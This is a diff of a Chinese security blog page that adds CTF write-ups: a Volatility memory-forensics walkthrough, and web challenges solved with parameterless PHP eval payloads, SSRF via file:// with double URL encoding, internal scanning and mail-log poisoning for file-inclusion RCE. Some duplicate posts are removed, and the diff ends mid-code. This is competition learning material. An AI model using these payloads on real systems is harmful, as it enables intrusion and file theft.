@@ -207,6 +207,299 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d7cc8e3b98.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d7cc8e3b98.html" class="post-title-link" itemprop="url">Volatility内存取证学习-复盘红帽杯Advertising for Marriage</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-14 22:17:16" itemprop="dateCreated datePublished" datetime="2019-11-14T22:17:16+08:00">2019-11-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:17:06" itemprop="dateModified" datetime="2020-10-14T17:17:06+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>458</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="获取镜像信息"><a href="#获取镜像信息" class="headerlink" title="获取镜像信息"></a>获取镜像信息</h1><pre><code class="shell">volatility -f &lt;file&gt; imageinfo</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191115/15738160914043.png" alt="img"></p>
+<h1 id="读取进程"><a href="#读取进程" class="headerlink" title="读取进程"></a>读取进程</h1><pre><code class="shell">volatility -f &lt;file&gt; --profile=WinXPSP2x86 psscan</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191115/15738161931286.png" alt="img"></p>
+<h1 id="读取指定进程内容"><a href="#读取指定进程内容" class="headerlink" title="读取指定进程内容"></a>读取指定进程内容</h1><pre><code class="shell">volatility -f 1.raw --profile=WinXPSP2x86 memdump -p 332 --dump-dir=./</code></pre>
+<pre><code class="shell">volatility -f 1.raw --profile=WinXPSP2x86 notepad</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191115/15738164635401.png" alt="img"></p>
+<ul>
+<li><p>提取出来的文件用gimp打开调整宽度直至出现图像</p>
+</li>
+<li><p><img src="http://goodcheerleung.gitee.io/mycute/20191116/15738341787357.png" alt="img"></p>
+</li>
+<li><p>综合得到提示</p>
+<pre><code>b1cxneedmoneyandgirlfirend</code></pre></li>
+</ul>
+<h1 id="搜索图片"><a href="#搜索图片" class="headerlink" title="搜索图片"></a>搜索图片</h1><pre><code class="shell">volatility -f 1.raw --profile=WinXPSP2x86  filescan | grep -E &#39;jpg|png|jpeg|bmp|gif&#39;</code></pre>
+<h1 id="提取图片"><a href="#提取图片" class="headerlink" title="提取图片"></a>提取图片</h1><pre><code>volatility -f 1.raw --profile=WinXPSP2x86 dumpfiles -Q 0x000000000249ae78  -n --dump-dir=./</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20191116/15738343277555.png" alt="img"></p>
+<h1 id="lsb解码、base64、维吉尼亚密码"><a href="#lsb解码、base64、维吉尼亚密码" class="headerlink" title="lsb解码、base64、维吉尼亚密码"></a>lsb解码、base64、维吉尼亚密码</h1><p><img src="http://goodcheerleung.gitee.io/mycute/20191116/15738780599940.jpg" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191116/15738780779999.jpg" alt="img"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d51d5193e2.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d51d5193e2.html" class="post-title-link" itemprop="url">上海大学生联赛部分write up</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-02 22:28:47" itemprop="dateCreated datePublished" datetime="2019-11-02T22:28:47+08:00">2019-11-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:17:18" itemprop="dateModified" datetime="2020-10-14T17:17:18+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>​        把010编辑器放进010编辑器直接搜索就是了</p>
+<h2 id="decade"><a href="#decade" class="headerlink" title="decade"></a>decade</h2><ul>
+<li><p>页面源码提示代码在<code>/code</code>并且flag在这个页面</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727051288542.png" alt="img"></p>
+</li>
+<li><p>代码和字节跳动的一道boring-code相似,但是过滤得更多</p>
+<pre><code class="php"> &lt;?php
+highlight_file(__FILE__);
+$code = $_GET[&#39;code&#39;];
+if (!empty($code)) {
+        if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code)) {
+            if (preg_match(&#39;/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) {
+                    echo &#39;bye~&#39;;
+                } else {
+                    eval($code);
+                }
+            }
+        else {
+            echo &quot;No way!!!&quot;;
+        }
+}else {
+        echo &quot;No way!!!&quot;;
+    }
+No way!!!</code></pre>
+</li>
+<li><p>在一轮FUZZ之后我们可以得知有下面函数可用。(翻了好久，总共能过这个正则的有300多个函数吧)</p>
+<pre><code class="php">echo、implode、scandir、chr、strrev、uniqid、file、chdir、next、pos、end</code></pre>
+</li>
+<li><p>我们用字节跳动的无参数RCE知道，要读取目录那么就必须构造出<code>scandir(&#39;.&#39;)</code>,一轮无脑翻阅手册后可以知道uniqid()会生成一个唯一的临牌，但是呢，他后半部分是会变化的，那么我们将其翻转过来就能动态构造任意字符如：</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+for($i=0;$i&lt;1000;$i++)
+echo(chr(strrev(uniqid())));
+?&gt;</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727060052967.png" alt="img"></p>
+</li>
+<li><p>非常明显已经可以构造在不断刷新这个网页在某一时刻就能构造出来点<code>（.）</code>进而读取到目录，而这里正则只允许26个字母构成的函数，所以var_dump这种是不可能使用了，所以这里使用<code>echo、implode</code>将返回的数组变成字符串来读取。那么构造payload如下，使用burpsuite去爆破。</p>
+<pre><code class="php">echo(implode(scandir(chr(strrev(uniqid())))));</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727064105621.png" alt="img"></p>
+</li>
+<li><p>可以看到已经读取了当前目录下的文件列表吗，那么下面就是要读取上层目录下的index.php文件。首先读取一下上层目录的列表，我们从上读取当前目录可以知道返回的文件目录数组如下关系：</p>
+<pre><code class="php\">[0=&gt;&#39;.&#39;,1=&gt;&#39;..&#39;,3=&gt;&#39;index.php&#39;]</code></pre>
+</li>
+<li><p>那么我们要读取上层目录就需要构造<code>scandir(&#39;..&#39;)</code>,那么很明显我们获取第二个元素即可得到两点，构造payload如下：</p>
+<pre><code class="php">  echo(implode(scandir(next(scandir(chr(strrev(uniqid())))))));</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727066455027.png" alt="img"></p>
+</li>
+<li><p>从这里我们可以得知index.php在最后一个元素，那么我们可以使用end()直接获取到，但是要读取到这个文件我们首先需要先跳转到这个目录，那么可以这样构造,使用chdir向上跳转一个目录：</p>
+<pre><code class="php">chdir(next(scandir(chr(strrev(uniqid())))))</code></pre>
+</li>
+<li><p>读取文件呢，我们可以使用第一个payload读取到文件目录，然后使用end()函数去读取最后一个元素，进而读取文件。</p>
+<pre><code class="php">file(end(scandir(chr(strrev(uniqid()))))</code></pre>
+</li>
+<li><p>那么综合起来payload如下：</p>
+<pre><code class="php">echo(implode(file(end(scandir(chr(strrev(uniqid(chdir(next(scandir(chr(strrev(uniqid())))))))))))));</code></pre>
+</li>
+<li><p>但是这里存在一个问题，那就是两次去的值不一定都是点，那么就需要进行N次爆破，在某一时刻这两个值都取到点的时候那么就会读取成功。                                                                                                                                                                                                                                 </p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727713396593.jpg" alt="img">                                                                                                                                                                                                                                                                       </p>
+</li>
+</ul>
+<h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><ul>
+<li><p>开头非常简单的ssrf，直接使用file:///协议即可读到内容</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+$x = $_GET[&#39;x&#39;];
+$pos = strpos($x,&quot;php&quot;);
+if($pos){
+        exit(&quot;denied&quot;);
+}
+$ch = curl_init();
+curl_setopt($ch,CURLOPT_URL,&quot;$x&quot;);
+curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+$result = curl_exec($ch);
+echo $result; </code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/1572771550497.png" alt="img"></p>
+</li>
+<li><p>这里直接读flag.php,直接使用双url编码绕过</p>
+<pre><code class="php">index.php?x=file:///var/www/html/flag.p%2568p</code></pre>
+</li>
+</ul>
+<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727716421531.png" alt="img"></p>
+<ul>
+<li><p>提示/etc/hosts</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727719047413.png" alt="img"></p>
+</li>
+<li><p>发现内网地址，直接爆破内网，发现172.18.0.2返回提示有文件包含漏洞</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727719455947.png" alt="img"></p>
+</li>
+<li><p>扫描这个主机开放的端口</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727720229388.png" alt="img"></p>
+</li>
+<li><p>发现25端口开放，这里可以联想到结合文件包含，使用 <code>gopherus</code> 污染日志文件从而达到RCE。使用 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ftarunkant%2FGopherus" target="_blank" rel="noopener"> gopherus </a>生成利用脚本。污染成功后使用文件包含即可rce，日志文件路径：</p>
+<pre><code class="php">/var/log/maillog
+/var/log/mail.log
+/var/adm/maillog
+/var/adm/syslog/mail.log</code></pre>
+</li>
+</ul>
+<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727724065385.png" alt="img"></p>
+<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727724916990.png" alt="img"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d711660d49.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -797,193 +1090,6 @@ $db = new mysqli($DATABASE[&#39;host&#39;],$DATABASE[&#39;username&#39;],$DATABA
 </ul>
 </li>
 </ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d51d5193e2.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d51d5193e2.html" class="post-title-link" itemprop="url">上海大学生联赛部分write up</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-11-02 22:28:47" itemprop="dateCreated datePublished" datetime="2019-11-02T22:28:47+08:00">2019-11-02</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:17:18" itemprop="dateModified" datetime="2020-10-14T17:17:18+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.3k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>​        把010编辑器放进010编辑器直接搜索就是了</p>
-<h2 id="decade"><a href="#decade" class="headerlink" title="decade"></a>decade</h2><ul>
-<li><p>页面源码提示代码在<code>/code</code>并且flag在这个页面</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727051288542.png" alt="img"></p>
-</li>
-<li><p>代码和字节跳动的一道boring-code相似,但是过滤得更多</p>
-<pre><code class="php"> &lt;?php
-highlight_file(__FILE__);
-$code = $_GET[&#39;code&#39;];
-if (!empty($code)) {
-        if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code)) {
-            if (preg_match(&#39;/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) {
-                    echo &#39;bye~&#39;;
-                } else {
-                    eval($code);
-                }
-            }
-        else {
-            echo &quot;No way!!!&quot;;
-        }
-}else {
-        echo &quot;No way!!!&quot;;
-    }
-No way!!!</code></pre>
-</li>
-<li><p>在一轮FUZZ之后我们可以得知有下面函数可用。(翻了好久，总共能过这个正则的有300多个函数吧)</p>
-<pre><code class="php">echo、implode、scandir、chr、strrev、uniqid、file、chdir、next、pos、end</code></pre>
-</li>
-<li><p>我们用字节跳动的无参数RCE知道，要读取目录那么就必须构造出<code>scandir(&#39;.&#39;)</code>,一轮无脑翻阅手册后可以知道uniqid()会生成一个唯一的临牌，但是呢，他后半部分是会变化的，那么我们将其翻转过来就能动态构造任意字符如：</p>
-<pre><code class="php">&lt;?php
-error_reporting(0);
-for($i=0;$i&lt;1000;$i++)
-echo(chr(strrev(uniqid())));
-?&gt;</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727060052967.png" alt="img"></p>
-</li>
-<li><p>非常明显已经可以构造在不断刷新这个网页在某一时刻就能构造出来点<code>（.）</code>进而读取到目录，而这里正则只允许26个字母构成的函数，所以var_dump这种是不可能使用了，所以这里使用<code>echo、implode</code>将返回的数组变成字符串来读取。那么构造payload如下，使用burpsuite去爆破。</p>
-<pre><code class="php">echo(implode(scandir(chr(strrev(uniqid())))));</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727064105621.png" alt="img"></p>
-</li>
-<li><p>可以看到已经读取了当前目录下的文件列表吗，那么下面就是要读取上层目录下的index.php文件。首先读取一下上层目录的列表，我们从上读取当前目录可以知道返回的文件目录数组如下关系：</p>
-<pre><code class="php\">[0=&gt;&#39;.&#39;,1=&gt;&#39;..&#39;,3=&gt;&#39;index.php&#39;]</code></pre>
-</li>
-<li><p>那么我们要读取上层目录就需要构造<code>scandir(&#39;..&#39;)</code>,那么很明显我们获取第二个元素即可得到两点，构造payload如下：</p>
-<pre><code class="php">  echo(implode(scandir(next(scandir(chr(strrev(uniqid())))))));</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727066455027.png" alt="img"></p>
-</li>
-<li><p>从这里我们可以得知index.php在最后一个元素，那么我们可以使用end()直接获取到，但是要读取到这个文件我们首先需要先跳转到这个目录，那么可以这样构造,使用chdir向上跳转一个目录：</p>
-<pre><code class="php">chdir(next(scandir(chr(strrev(uniqid())))))</code></pre>
-</li>
-<li><p>读取文件呢，我们可以使用第一个payload读取到文件目录，然后使用end()函数去读取最后一个元素，进而读取文件。</p>
-<pre><code class="php">file(end(scandir(chr(strrev(uniqid()))))</code></pre>
-</li>
-<li><p>那么综合起来payload如下：</p>
-<pre><code class="php">echo(implode(file(end(scandir(chr(strrev(uniqid(chdir(next(scandir(chr(strrev(uniqid())))))))))))));</code></pre>
-</li>
-<li><p>但是这里存在一个问题，那就是两次去的值不一定都是点，那么就需要进行N次爆破，在某一时刻这两个值都取到点的时候那么就会读取成功。                                                                                                                                                                                                                                 </p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727713396593.jpg" alt="img">                                                                                                                                                                                                                                                                       </p>
-</li>
-</ul>
-<h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><ul>
-<li><p>开头非常简单的ssrf，直接使用file:///协议即可读到内容</p>
-<pre><code class="php">&lt;?php
-highlight_file(__FILE__);
-$x = $_GET[&#39;x&#39;];
-$pos = strpos($x,&quot;php&quot;);
-if($pos){
-        exit(&quot;denied&quot;);
-}
-$ch = curl_init();
-curl_setopt($ch,CURLOPT_URL,&quot;$x&quot;);
-curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
-$result = curl_exec($ch);
-echo $result; </code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/1572771550497.png" alt="img"></p>
-</li>
-<li><p>这里直接读flag.php,直接使用双url编码绕过</p>
-<pre><code class="php">index.php?x=file:///var/www/html/flag.p%2568p</code></pre>
-</li>
-</ul>
-<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727716421531.png" alt="img"></p>
-<ul>
-<li><p>提示/etc/hosts</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727719047413.png" alt="img"></p>
-</li>
-<li><p>发现内网地址，直接爆破内网，发现172.18.0.2返回提示有文件包含漏洞</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727719455947.png" alt="img"></p>
-</li>
-<li><p>扫描这个主机开放的端口</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727720229388.png" alt="img"></p>
-</li>
-<li><p>发现25端口开放，这里可以联想到结合文件包含，使用 <code>gopherus</code> 污染日志文件从而达到RCE。使用 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ftarunkant%2FGopherus" target="_blank" rel="noopener"> gopherus </a>生成利用脚本。污染成功后使用文件包含即可rce，日志文件路径：</p>
-<pre><code class="php">/var/log/maillog
-/var/log/mail.log
-/var/adm/maillog
-/var/adm/syslog/mail.log</code></pre>
-</li>
-</ul>
-<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727724065385.png" alt="img"></p>
-<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727724916990.png" alt="img"></p>
 
       
     </div>
@@ -3014,224 +3120,6 @@ if(!isset($_GET[&#39;num&#39;])){
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d5c8fc5c96.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d5c8fc5c96.html" class="post-title-link" itemprop="url">复现ByteCTF-boringcode</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-10-07 14:11:33" itemprop="dateCreated datePublished" datetime="2019-10-07T14:11:33+08:00">2019-10-07</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:15:55" itemprop="dateModified" datetime="2020-10-14T17:15:55+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>3.6k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次比赛没做出来，看着大佬的write up复现，思路真的很骚。</p>
-<h2 id="Boringcode"><a href="#Boringcode" class="headerlink" title="Boringcode"></a>Boringcode</h2><ul>
-<li><strong>源码</strong></li>
-</ul>
-<pre><code class="php">&lt;?php
-function is_valid_url($url) {
-    if (filter_var($url, FILTER_VALIDATE_URL)) {
-        if (preg_match(&#39;/data:\/\//i&#39;, $url)) {
-            return false;
-        }
-        return true;
-    }
-    return false;
-}
-
-if (isset($_POST[&#39;url&#39;])){
-    $url = $_POST[&#39;url&#39;];
-    if (is_valid_url($url)) {
-        $r = parse_url($url);
-        if (preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])) {
-            $code = file_get_contents($url);
-            if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code)) {
-                if (preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) {
-                    echo &#39;bye~&#39;;
-                } else {
-                    eval($code);
-                }
-            }
-        } else {
-            echo &quot;error: host not allowed&quot;;
-        }
-    } else {
-        echo &quot;error: invalid url&quot;;
-    }
-}else{
-    highlight_file(__FILE__);
-}</code></pre>
-<h3 id="考点1"><a href="#考点1" class="headerlink" title="考点1"></a>考点1</h3><pre><code class="php"> if (is_valid_url($url)) {
-        $r = parse_url($url);
-        if (preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])) {
-            $code = file_get_contents($url);</code></pre>
-<p>这里如果没有<code>is_valid_url($url)</code>是可以使用data伪协议进行绕过，但是<code>is_valid_url($url)</code>对data进行了过滤使用伪协议这条数行不通，但是也学到了data伪协议可以绕过域名的限制。,但是绕过该点要不一个baidu的鸡肋跳转漏洞要不就是买个xxxbaidu.com的域名。</p>
-<p>例如：</p>
-<pre><code class="php">&lt;?php
-$url = $_POST[&#39;url&#39;];
-$r = parse_url($url);
-if (preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])) {
-            $code = file_get_contents($url);
-        }
-
-eval($code);
-?&gt;</code></pre>
-<p>payload:</p>
-<pre><code class="php">url=data://baidu.com/plain;base64,cGhwaW5mbygpOw==</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191007/15704299387377.png" alt="img"></p>
-<hr>
-<h3 id="考点2"><a href="#考点2" class="headerlink" title="考点2"></a>考点2</h3><pre><code class="php">if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code)) {
-                if (preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) {
-                    echo &#39;bye~&#39;;
-                } else {
-                    eval($code);
-                }</code></pre>
-<p>这里会把函数给替换为空，如果替换结果剩下一个<code>“；”</code>那么就可以绕过这个正则。</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191007/15704330592656.png" alt="img"></p>
-<p>可以观察到，这个正则只会匹配函数为纯字母并且参数为空的payload。也就是说我们传入的值必须是一个只含字母并且没有参数的函数的payload.同时可以注意到这个是可以进行一个函数的套用。那就是说让我们构造多个空参数的函数去读取flag.</p>
-<p>我们看如下几个函数：</p>
-<pre><code class="php">scandir() 
-    var_dump(scandir(&#39;.&#39;));
-    array(3) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; } </code></pre>
-<p>了一看到<code>scandir(&#39;.&#39;)</code>能够返回当前目录的文件列表的数组，那么怎么取出文件名和读取文件呢，可以使用：</p>
-<pre><code class="php">end()//读取数组最后一个元素
-readfile()//输出一个文件</code></pre>
-<p>那么就可以构造如下payload:</p>
-<pre><code class="php">readfile(end(scandir(&#39;.&#39;)))</code></pre>
-<p>问题又来了，我们不不能够有这个参数那么点又如何构造呢？从大佬的write up中看到两个方法。</p>
-<ol>
-<li><pre><code class="php">localeconv()
-    var_dump(localeconv());
-    array(18) { 
-        [&quot;decimal_point&quot;]=&gt; string(1) &quot;.&quot; 
-        [&quot;thousands_sep&quot;]=&gt; string(0) &quot;&quot; 
-        [&quot;int_curr_symbol&quot;]=&gt; string(0) &quot;&quot;
-        [&quot;currency_symbol&quot;]=&gt; string(0) &quot;&quot; 
-        [&quot;mon_decimal_point&quot;]=&gt; string(0) &quot;&quot;
-        .......
-    } </code></pre>
-</li>
-</ol>
-<p>该函数返回一个当地数字以及货币信息的数组，可以看到返回值第一个就是<code>“.”</code>,而与end()相反的取第一个元素的函数有:</p>
-<pre><code class="php">current()       返回数组中的当前单元, 默认取第一个值
-pos()           current() 的别名</code></pre>
-<p>那么就可以构造如下payload.可以读取到文件本地文件。</p>
-<pre><code class="php">readfile(end(scandir(pos(localeconv()))))</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20191007/15704367249781.png" alt="img"></p>
-<p>但是flag并不在本文件夹下，那么就需要用到改变当前目录的函数:</p>
-<pre><code class="php">chdir() 函数改变当前的目录。
